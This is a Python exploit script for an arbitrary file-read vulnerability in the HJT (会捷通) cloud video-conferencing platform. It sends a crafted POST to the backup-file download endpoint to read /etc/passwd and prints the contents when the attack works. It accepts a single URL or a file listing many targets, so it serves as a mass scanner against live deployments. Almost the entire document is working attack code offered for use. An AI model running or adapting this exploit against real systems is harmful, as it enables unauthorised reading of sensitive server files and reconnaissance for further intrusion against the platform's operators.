#!/usr/bin/env python
# -*- conding:utf-8 -*-

import requests
import argparse
import sys
import urllib3
urllib3.disable_warnings()

def title():
    print("""
                                  会捷通云视讯平台任意文件读取
                                use: python3 hjtcloud-read.py
                                     Author: Henry4E36
               """)

class information(object):
    def __init__(self,args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        target_url = self.url + "/fileDownload?action=downloadBackupFile"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
        }

        data ="""fullPath=/etc/passwd"""
        try:
            res = requests.post(url=target_url,headers=headers,data=data,verify=False,timeout=5)
            if "root:" in res.text and res.status_code == 200:
                print(f"\033[31m[{chr(8730)}] 目标系统: {self.url} 存在任意文件读取！\033[0m")
                print(f"[-] 正在读取/etc/passwd文件......")
                print(f"\033[31m[{chr(8730)}\033[0m] 响应为:\n{res.text.strip()}")
                print("[-------------------------------------------------------------]")
            else:
                print(f"[\033[31mx\033[0m]  目标系统: {self.url} 不存在任意文件读取！")
                print("[-------------------------------------------------------------]")
        except Exception as e:
            print("[\033[31mX\033[0m]  连接错误！")
            print("[-------------------------------------------------------------]")

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)





if __name__ == "__main__":
    title()
    parser = ar=argparse.ArgumentParser(description='会捷通云视讯平台任意文件读取')
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 hjtcloud-read.py -u http://127.0.0.1\neg2:>>>python3 hjtcloud-read.py -f ip.txt")
    elif args.url:
        information(args).target_url()

    elif args.file:
        information(args).file_url()

